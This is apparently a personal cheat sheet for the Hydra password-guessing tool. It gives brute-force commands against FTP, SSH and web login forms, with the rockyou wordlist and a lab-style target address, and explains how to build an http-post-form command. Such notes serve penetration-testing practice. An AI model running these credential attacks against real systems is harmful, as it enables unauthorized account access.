# options

| Section | Function |
|-------|--------|
| -t 4| Number of parallel connections per target |

# examples

## ftp
```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

## web login
```bash
hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
```
## ssh
```bash
hydra -l user -P passlist ip -t 64 ssh
```

# set up the command for web login



## command build

```
With all the information that we have collected now let’s build the hydra command.
Change the <Login page> this value has to start with “/” backspace.
Change <Request body> with the format from the page. We do need to modify the username and password. Replace the failed username with ^USER^ and the failed password with ^PASS^. This change will allow hydra to substitute the values.
Change the <Error Message> with the failed login error message.
Change the <IP Address> with either an IP address or hostname.
Change the <User> with either username or username list.
Change the <Password> with either a password or password list.
Layout of command: hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
```
